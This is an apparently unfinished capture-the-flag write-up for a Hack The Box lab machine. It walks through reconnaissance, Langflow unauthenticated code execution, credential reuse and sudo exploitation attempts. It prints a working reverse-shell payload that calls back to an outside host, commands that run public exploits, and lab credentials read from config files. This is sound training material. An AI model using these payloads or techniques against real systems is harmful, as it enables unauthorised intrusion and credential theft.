---
publish: true
tags:
  - unfinished
---
Today we'll do the [Fireflow](https://app.hackthebox.com/machines/Fireflow) HTB's machine :)

First of all we need to add the register to `/etc/hosts`:

![[Fireflow - Adding host.png]]
```
$ echo "10.129.88.33 fireflow.htb" | sudo tee -a /etc/hosts
10.129.88.33 fireflow.htb
```

And please, DO NOT FORGET to use `-a` if you don't want to fully rewrite your `/etc/hosts` file (already happened to me).

# Enumeration

## Port Scanning

You can use any port scanner, like [Rustscan](https://github.com/bee-san/RustScan) or [Nmap](https://nmap.org/), but I'll use [Naabu](https://github.com/projectdiscovery/naabu), by projectdiscovery (same creators of httpx, subfinder, nuclei and others).

First, let's run it and then use Nmap to run default scripts (`-A`, naabu are currently implementing services and versions detection, so if you're reading this, you should check the repository for more information)

```
[3,979s][~] ᛋᛋ naabu -host 10.129.88.33 -p -                

                  __
  ___  ___  ___ _/ /  __ __
 / _ \/ _ \/ _ \/ _ \/ // /
/_//_/\_,_/\_,_/_.__/\_,_/

		projectdiscovery.io

[INF] Current naabu version 2.6.1 (latest)
[WRN] UI Dashboard is disabled, Use -dashboard option to enable
[INF] Running CONNECT scan with non root privileges
10.129.88.33:22
10.129.88.33:443
[INF] Found 2 ports on host 10.129.88.33 (10.129.88.33)
```

Alright, now we can use the nmap default scripts to get banners and others

```
[2m14,942s][~] ᛋᛋ sudo nmap -A 10.129.88.33 -p22,443,65535 -T5
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-18 16:40 -0300
Nmap scan report for fireflow.htb (10.129.88.33)
Host is up (0.17s latency).

PORT      STATE  SERVICE  VERSION
22/tcp    open   ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
443/tcp   open   ssl/http nginx
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Not valid before: 2026-04-14T16:35:31
|_Not valid after:  2028-07-17T16:35:31
|_http-title: FireFlow \xE2\x80\x94 Task Force Nightfall
65535/tcp closed unknown
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 65535/tcp)
HOP RTT       ADDRESS
1   222.76 ms 10.10.14.1
2   222.83 ms fireflow.htb (10.129.88.33)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.57 seconds
```

> [!tip] Nmap OS Detection trick
> If you already know open ports, add a random port to `-p` argument, so nmap can detect the OS more accurately :)

So we already know that the running service is called _"Task Force Nightfall"_ (for htb machines, it's probably a fictional website, but you shall check it anyways, if isn't). Let's enumerate subdomains!

## Subdomain fuzzing

In my daily recon process, I use [FFuF](https://github.com/ffuf/ffuf) to web enumeration, so let's keep it as it is :p

To do an accurate subdomain enumeration, we need to know how to do this, without touching DNS, because the HTB app is under `/etc/hosts`. To do this, we'll use a technique that uses the `Host` header to enumerate possible subdomains by using a response-size filter.

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://machine.htb" -H "Host: FUZZ.machine.htb" -fs <default_res_size>
```

To discover the default response size, we can send requests to the host using a obviously non-existent subdomain (like `deadbeef.machine.htb`, etc). To do this, you can send tons of requests with pseudo-random domains, but for tests-only, you can use this:

```
for i in {1..25}; do
    curl -s -o /dev/null -w '%{http_code} %{size_download}\n' \
      -H "Host: random-$i.machine.htb" \
      http://machine.htb
done
```

Let's apply this technique in Fireflow 🔥

```
for i in {1..25}; do
    curl -s -k -o /dev/null -w '%{http_code} %{size_download}\n' \
      -H "Host: random-$i.fireflow.htb" \
      https://fireflow.htb
done
```

With the addition of `-k` to arguments, we could successfully get the default response size:

```
[2,953s][130][~/Hacking/CTFs/Fireflow] ᛋᛋ for i in {1..25}; do
    curl -s -k -o /dev/null -w '%{http_code} %{size_download}\n' \
      -H "Host: random-$i.fireflow.htb" \
      https://fireflow.htb
done
301 162
301 162
301 162
301 162
```

> [!tip] Why I need to use the `-k` flag?
> The host has a invalid ssl certificate, so if you don't use it, curl will throw this error: `curl: (60) SSL certificate OpenSSL verify result: self-signed certificate (18)` and `curl failed to verify the legitimacy of the server and therefore could not establish a secure connection to it`.

![[Fireflow - ffuf subdomain.png]]
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "https://fireflow.htb" -H "Host: FUZZ.fireflow.htb" -fs 162 -c  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : https://fireflow.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.fireflow.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 162
________________________________________________

flow                    [Status: 200, Size: 1142, Words: 132, Lines: 25, Duration: 217ms]
```

So we find the flow subdomain, let's add it to our `/etc/hosts`

```
[14ms][~/Hacking/CTFs/Fireflow] ᛋᛋ echo "10.129.244.214 flow.fireflow.htb" | sudo tee -a /etc/hosts
10.129.244.214 flow.fireflow.htb
[1,463s][~/Hacking/CTFs/Fireflow] ᛋᛋ 
```

## More Port Scanning

We discovered a valid subdomain, so we can suppose that some services may respond differently.

```
[1,463s][~/Hacking/CTFs/Fireflow] ᛋᛋ naabu -host flow.fireflow.htb -p -

                  __
  ___  ___  ___ _/ /  __ __
 / _ \/ _ \/ _ \/ _ \/ // /
/_//_/\_,_/\_,_/_.__/\_,_/

		projectdiscovery.io

[INF] Current naabu version 2.6.1 (latest)
[WRN] UI Dashboard is disabled, Use -dashboard option to enable
[INF] Running CONNECT scan with non root privileges
flow.fireflow.htb:22
flow.fireflow.htb:443
[INF] Found 2 ports on host flow.fireflow.htb (10.129.244.214)
[2m15,336s][~/Hacking/CTFs/Fireflow] ᛋᛋ
```

Same ports open, let's check if something changed in nmap default scripts

```
[2m15,336s][~/Hacking/CTFs/Fireflow] ᛋᛋ sudo nmap -A flow.fireflow.htb -p22,443,65535 -T5
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-19 16:34 -0300
Nmap scan report for flow.fireflow.htb (10.129.244.214)
Host is up (0.15s latency).
rDNS record for 10.129.244.214: fireflow.htb

PORT      STATE  SERVICE   VERSION
22/tcp    open   ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
443/tcp   open   ssl/https nginx
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Not valid before: 2026-04-14T16:35:31
|_Not valid after:  2028-07-17T16:35:31
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: Langflow
|_http-server-header: nginx
|_ssl-date: TLS randomness does not represent time
65535/tcp closed unknown
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 65535/tcp)
HOP RTT       ADDRESS
1   147.17 ms 10.10.14.1
2   147.47 ms fireflow.htb (10.129.244.214)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.31 seconds
[20,840s][~/Hacking/CTFs/Fireflow] ᛋᛋ 
```

I noticed that the title changed from `FireFlow \xE2\x80\x94 Task Force Nightfall` to `Langflow` (which is a well-known Low-code AI builder for agentic and RAG applications, as their website is saying).

## Directories Fuzzing

After subdomain enumeration, we could start directories fuzzing, I'll keep using FFuF with my default parameters:

```
ffuf -u <http/s>://machine.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -fc 404,500 -o dirs/machine.htb/out -of all -e .html,.php,.aspx,.js,.css,.htm,.jsp -t 500
```

> [!tip] How to make FFuF blazing fast?
> You can use the `-t` flag to increase the threads amount!
> Start with `-t 200` and then scale up to `-t 800`, which can handle almost every wordlist.
> Don't forget, any real-world website will block your requests (rate limiting).

So I ran it against the fireflow, and then against it's subdomain:

```
[2,569s][~/Hacking/CTFs/Fireflow] ᛋᛋ ffuf -u https://fireflow.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -fc 404,500 -o dirs/fireflow.htb/out -of all -e .html,.php,.aspx,.js,.css,.htm,.jsp -t 500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : https://fireflow.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Extensions       : .html .php .aspx .js .css .htm .jsp 
 :: Output file      : dirs/fireflow.htb/out.{json,ejson,html,md,csv,ecsv}
 :: File format      : all
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 500
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404,500
________________________________________________

index.html              [Status: 200, Size: 12913, Words: 2516, Lines: 299, Duration: 147ms]
:: Progress: [239992/239992] :: Job [1/1] :: 639 req/sec :: Duration: [0:02:00] :: Errors: 8 ::
```

We just found `index.html`, which I already expected, as the website is just a landing page, so we could discover the langflow subdomain. Let's run it again, but against the `flow.fireflow.htb` domain:

In my first attempt, everything (literally everything, even `GET /skibid.aspx`) was returning http 200, so I added some filters:

```
ffuf -u https://flow.fireflow.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -fc 404,500 -o dirs/flow.fireflow.htb/out -of all -e .html,.php,.aspx,.js,.css,.htm,.jsp -t 500 -fs 0,1142 -fw 1,132
```

And now I could normally keep fuzzing. Unfortunately I just found a `/logs` and `/docs`, and they're both useless:

```
[8m46,642s][~/Hacking/CTFs/Fireflow] ᛋᛋ curl -k https://flow.fireflow.htb/logs
{"detail":"No authentication credentials provided"}
[0,727s][~/Hacking/CTFs/Fireflow] ᛋᛋ 
```

## LangFlow CVE

After a fast search, I discovered the `/api/v1/version` endpoint, which is useful to search for already known vulnerabilities in the version, using exploitdb (or just googling it).

```
[0,710s][~/Hacking/CTFs/Fireflow] ᛋᛋ curl -ks https://flow.fireflow.htb/api/v1/version | jq
{
  "version": "1.8.2",
  "main_version": "1.8.2",
  "package": "Langflow"
}
[0,684s][~/Hacking/CTFs/Fireflow] ᛋᛋ 
```

After another quick search, I found the CVE [2026-33017](https://nvd.nist.gov/vuln/detail/CVE-2026-33017), which is a unauthenticated RCE in LangFlow `/api/v1/build_public_tmp/{flow_id}/flow` endpoints, which allows building public flows by any unauthenticated user.

I could exploit this manually, but I found a public PoC on github: https://github.com/EQSTLab/CVE-2026-33017, so let's exploit it!

# Initial Access

## Understanding CVE 2026-33017 - Unauthenticated RCE in LangFlow

The logic error is that anyone can create a custom component, whose python code is executed on the server, through a `build_public_tmp` request. This code can get a shell access. Here is a PoC request:

```http
POST /api/v1/build_public_tmp/00000000-0000-0000-0000-000000000001/flow?event_delivery=direct&log_builds=false HTTP/1.1
Host: localhost:7860
Content-Type: application/json
Cookie: client_id=12345678-1234-1234-1234-123456789012
Connection: close

{
  "data": {
    "nodes": [
      {
        "id": "Exploit",
        "data": {
          "id": "Exploit",
          "type": "ExploitComp",
          "node": {
            "template": {
              "_type": "Component",
              "code": {
                "type": "code",
                "value": "from lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name = 'X'\n    outputs = [Output(display_name='O', name='o', method='r')]\n\n    def r(self) -> Data:\n        import socket,subprocess\n        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n        s.connect(('192.168.102.178', 4444))\n        p = subprocess.Popen(['/bin/bash', '-i'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())\n        p.wait()\n        return Data(data={'ok': 1})"
              }
            },
            "outputs": [
              { "types": ["Data"], "name": "o", "method": "r" }
            ]
          }
        }
      }
    ],
    "edges": []
  }
}
```

As we can see, it runs a bash instance and redirects it to our listener.

To actively exploit this CVE, you just need a vulnerable target, and a public flow id.

## Exploiting LangFlow (or trying)

First of all we need a public flow id, so I firstly tried to logging into the website, unfortunately, I got a infinite loading screen:

![[Fireflow - langflow loading.png|640]]

## Bypassing Infinite Loading

I tried dropping the cache or removing any session cookies, but nothing worked, so I opened my devtools console and tried sniffing into the requests, I found that the website is trying to "refresh" the session, using a Refresh Token (commonly a JWT).

![[Fireflow - Network Devtools.png]]

We haven't a valid session or a valid refresh token, as we can see in the response body:

```json
{"detail":"Invalid refresh token"}
```

After that I opened [Caido](https://www.caido.io/) and searched for any response of the `/refresh` endpoint, and I found this:

```http
HTTP/1.1 401 Unauthorized
Server: nginx
Date: Wed, 19 Aug 2026 22:43:10 GMT
Content-Type: application/json
Content-Length: 34
Connection: keep-alive
www-authenticate: Bearer
access-control-allow-credentials: true
access-control-allow-origin: https://flow.fireflow.htb
vary: Origin
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: ws: wss:;

{
    "detail": "Invalid refresh token"
}
```

Sometimes the response is code 401, sometimes 403, so I thought _"Yo, I'll just change it with Match & Replace duuh"_ and I did it. I created this two rules:

![[Fireflow - MnR rule 403.png]]

![[Fireflow - MnR rule 401.png]]

And (thanks God) it worked!

![[Fireflow - LangFlow login page.png]]

## Shell Access Exploiting

After obtaining access to the sign up menu, I create an account using the credentials: `1337:1337` BUT I get an error that says: "Waiting for approval". Everything indicates that an admin needs to approve my brand new account.

![[Fireflow - Waiting For Approval.png]]

The only thing that we need is a valid flow id, so I tried searching among the landing page at fireflow.htb. I found a button that redirects to a playground (that is inactive):

![[Fireflow - Playground button.png]]

This just redirected us to https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25, which obviously contains a valid uuid in the URL. I tried accessing https://flow.fireflow.htb/flows/7d84d636-af65-42e4-ac38-26e867052c25 but it just redirected me to the index (because I'm not authenticated).

Time to run the exploit, I ran it just with the `--help` flag just to get the parameters:

```
[249ms][2][main][~/Hacking/CTFs/Fireflow/CVE-2026-33017] ᛋᛋ python exploit.py --help
usage: exploit.py [-h] --url URL --flow-id FLOW_ID --lhost LHOST --lport LPORT [--listen] [--timeout TIMEOUT]

CVE-2026-33017 unauth build_public_tmp code-execution PoC

options:
  -h, --help         show this help message and exit
  --url URL          Target Langflow server URL
  --flow-id FLOW_ID  UUID of the shared public flow
  --lhost LHOST      Reverse shell callback IP
  --lport LPORT      Reverse shell callback port
  --listen           Run the built-in listener
  --timeout TIMEOUT
[150ms][main][~/Hacking/CTFs/Fireflow/CVE-2026-33017] ᛋᛋ 
```

Wasn't that hard to build the command with the parameters that I already know, I just started my shell handler, [penelope](https://github.com/brightio/penelope), and then ran the exploit:

```
[142ms][2][main][~/Hacking/CTFs/Fireflow/CVE-2026-33017] ᛋᛋ python exploit.py --lhost 10.10.15.160 --lport 4444 --url https://flow.fireflow.htb --flow-id 7d84d636-af65-42e4-ac38-26e867052c25
[*] Target: https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&log_builds=false
[*] Callback: 10.10.15.160:4444
[*] Request returned no response (expected if shell connected): HTTPSConnectionPool(host='flow.fireflow.htb', port=443): Max retries exceeded with url: /api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&log_builds=false (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:1082)')))
[530ms][main][~/Hacking/CTFs/Fireflow/CVE-2026-33017] ᛋᛋ
```

This error happens because the website haven't a valid certificate, I just fixed it in the exploit.py:

```python
# Around line 107
def send_payload():
    print(f"[*] Target: {endpoint}")
    print(f"[*] Callback: {args.lhost}:{args.lport}")
    try:
        resp = requests.post(
            endpoint,
            json=build_payload(args.lhost, args.lport),
            cookies={"client_id": "poc"},
            timeout=args.timeout,
            verify=False # Just disabled SSL Verifying
        )
        print(f"[*] HTTP {resp.status_code}")
    except requests.RequestException as e:
        print(f"[*] Request returned no response (expected if shell connected): {e}")
```

And then ran it again:

```
[1m12,995s][main][~/Hacking/CTFs/Fireflow/CVE-2026-33017] ᛋᛋ python exploit.py --lhost 10.10.15.160 --lport 4444 --url https://flow.fireflow.htb --flow-id 7d84d636-af65-42e4-ac38-26e867052c25
[*] Target: https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&log_builds=false
[*] Callback: 10.10.15.160:4444
[14,243s][130][main][~/Hacking/CTFs/Fireflow/CVE-2026-33017] ᛋᛋ 
```

![[Fireflow - Penelope Shell as www-data.png]]

# User Privilege Escalation

## langflow.db

After that, I checked this langflow.db, what I want here is a sqlite3 database, so I could easily dump it's data. To check it, I just needed to run:

```
file langflow.db
```

And then get my output:

```sh
www-data@fireflow:/var/lib/langflow$ file langflow.db
langflow.db: empty
```

This says that the langflow.db file is empty, but I'll check it with sqlite3 anyways:

```sh
www-data@fireflow:/var/lib/langflow$ which sqlite3
/usr/bin/sqlite3
www-data@fireflow:/var/lib/langflow$ sqlite3 langflow.db 
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
sqlite> .databases
main: /var/lib/langflow/langflow.db r/o
sqlite> 
```

## Enumerating

So yes, it's actually empty, I'll keep enumerating the system, firstly I ran `getcap`, so if python or any other binary has `cap_setuid` it'll be an easy rooting:

```sh
www-data@fireflow:/var/lib/langflow$ which getcap
/usr/sbin/getcap
www-data@fireflow:/var/lib/langflow$ getcap -r /
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
www-data@fireflow:/var/lib/langflow$ 
```

Nothing here, let's keep enumerating. Now I targeted `sudo` (well-known for CVEs like [CVE 2025-32463](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)):

```sh
www-data@fireflow:/var/lib/langflow$ sudo -V
Sudo version 1.9.15p5
Sudoers policy plugin version 1.9.15p5
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.15p5
Sudoers audit plugin version 1.9.15p5
www-data@fireflow:/var/lib/langflow$ sudo -l
[sudo] password for www-data: 
sudo: a password is required
www-data@fireflow:/var/lib/langflow$ 
```

## CVE 2025-32463

The `sudo` is under a vulnerable version: `1.9.15p5` (as chwoot targets 1.9.14 up to 1.9.17, including every _p_ revision). I downloaded the public exploit to my `/tmp` directory and then uploaded it using penelope:

![[Fireflow - Uploaded sudo-chwoot.png]]

And then I tried running the exploit:

```sh
www-data@fireflow:/tmp$ chmod +x sudo-chwoot.sh 
www-data@fireflow:/tmp$ ls -lAh
total 60K
drwxr-xr-x 1 root     root     4.0K Aug 20 01:17 ctd-volume338964395
drwxrwxrwt 2 root     root     4.0K Aug 20 01:15 .font-unix
drwxrwxrwt 2 root     root     4.0K Aug 20 01:15 .ICE-unix
drwx------ 2 root     root     4.0K Aug 20 01:15 snap-private-tmp
-rwxr-xr-x 1 www-data www-data 1.1K Aug 20 02:00 sudo-chwoot.sh
drwx------ 3 root     root     4.0K Aug 20 01:37 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-fwupd.service-dPhxij
drwx------ 3 root     root     4.0K Aug 20 01:15 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-ModemManager.service-Piw5ZD
drwx------ 3 root     root     4.0K Aug 20 01:15 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-polkit.service-WFC0f9
drwx------ 3 root     root     4.0K Aug 20 01:15 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-systemd-logind.service-tAVqS7
drwx------ 3 root     root     4.0K Aug 20 01:15 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-systemd-resolved.service-pLBMsO
drwx------ 3 root     root     4.0K Aug 20 01:15 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-systemd-timesyncd.service-z4x3zw
drwx------ 3 root     root     4.0K Aug 20 01:37 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-upower.service-aH0xhs
drwx------ 2 root     root     4.0K Aug 20 01:16 vmware-root_679-3988687326
drwxrwxrwt 2 root     root     4.0K Aug 20 01:15 .X11-unix
drwxrwxrwt 2 root     root     4.0K Aug 20 01:15 .XIM-unix
www-data@fireflow:/tmp$ ./sudo-chwoot.sh 
woot!
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
sudo: 3 incorrect password attempts
www-data@fireflow:/tmp$ 
```

Unfortunately, the machine `www-data` user has a password (which isn't expected), so this won't work.

## More enumeration

Now I attempted to find the "common" stuff: SUID Binaries. I just needed to run `find` command with some parameters:

```sh
www-data@fireflow:/tmp$ find / -type f -perm -4000 2>/dev/null 
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
www-data@fireflow:/tmp$ 
```

Nothing again, I'll check now for `.env` files, using `find` again:

```sh
www-data@fireflow:/tmp$ find / -type f -name .env 2>/dev/null
/etc/langflow/.env
www-data@fireflow:/tmp$ cat /etc/langflow/.env
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_CONFIG_DIR=/var/lib/langflow
LANGFLOW_LOG_LEVEL=warning
LANGFLOW_NEW_USER_IS_ACTIVE=False
LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
www-data@fireflow:/tmp$ 
```

## Password Reuse: Shell as nightfall

We got it, I need to check for users in `/home` and with shell in `/etc/passwd`, to abuse a possible CWE 260 for ssh (which is Password in Configuration File).

```
www-data@fireflow:/tmp$ ls /home
nightfall
www-data@fireflow:/tmp$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
nightfall:x:1000:1000::/home/nightfall:/bin/bash
www-data@fireflow:/tmp$ 
```

So we already know the `nighfall` user, let's try the password `n1ghtm4r3_b4_n1ghtf4ll` for logging in:

```sh
www-data@fireflow:/tmp$ su nightfall
Password: 
nightfall@fireflow:/tmp$ id
uid=1000(nightfall) gid=1000(nightfall) groups=1000(nightfall)
nightfall@fireflow:/tmp$ 
```

It works! Now I'll just try using it with ssh (the port 22 was open too):

![[Fireflow - Connecting as nightfall through ssh.png]]

And it works too! Now let's keep escalating our privileges to root!

# Local Privilege Escalation to Root

First of all I'll search for any configuration file in my home directory and for any creds in the environment:

```sh
nightfall@fireflow:~$ ls -lAh
total 28K
lrwxrwxrwx 1 root      root         9 May 12 14:24 .bash_history -> /dev/null
-rw-r--r-- 1 nightfall nightfall  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 nightfall nightfall 3.7K Mar 31  2024 .bashrc
drwx------ 2 nightfall nightfall 4.0K May 12 15:28 .cache
drwxrwxr-x 3 nightfall nightfall 4.0K May 12 15:28 .local
drwx------ 2 nightfall nightfall 4.0K Aug 20 01:15 .mcp
-rw-r--r-- 1 nightfall nightfall  807 Mar 31  2024 .profile
-rw-r----- 1 root      nightfall   33 Aug 20 01:16 user.txt
nightfall@fireflow:~$ ls .mcp/
config.json
nightfall@fireflow:~$ cat .mcp/config.json 
{
  "server": "http://10.129.89.39:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
nightfall@fireflow:~$ env
SHELL=/usr/bin/bash
HISTCONTROL=ignoreboth
PWD=/home/nightfall
LOGNAME=nightfall
XDG_SESSION_TYPE=tty
HOME=/home/nightfall
LANG=en_US.UTF-8
HISTFILE=/dev/null
LS_COLORS=<this env is a bit large, but haven't nothing interesting>
SSH_CONNECTION=10.10.15.160 39650 10.129.89.39 22
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
USER=nightfall
SHLVL=3
XDG_SESSION_ID=13
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=10.10.15.160 39650 22
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
_=/usr/bin/env
nightfall@fireflow:~$ 
```

## Enumerating the MCP AI Tool Registry

I just got a login and password to another web app, let's reach it with curl:

```sh
nightfall@fireflow:~$ curl -s http://10.129.89.39:30080/api/v1/version | jq
{
  "service": "MCP AI Tool Registry",
  "version": "0.1.0",
  "auth": {
    "type": "JWT",
    "header": "Authorization: Bearer <token>",
    "supported_algorithms": [
      "HS256",
      "none"
    ]
  },
  "docs": "/docs",
  "endpoints": [
    "POST /mcp                        [MCP JSON-RPC 2.0]",
    "POST /api/v1/auth",
    "GET  /api/v1/tools",
    "POST /api/v1/tools               [admin]"
  ]
}
nightfall@fireflow:~$ 
```

One interesting thing, we can use `none` as our algorithm, this is a attack vector to escalate our privileges, just editing our JWT and signing it with _none algorithm_.

---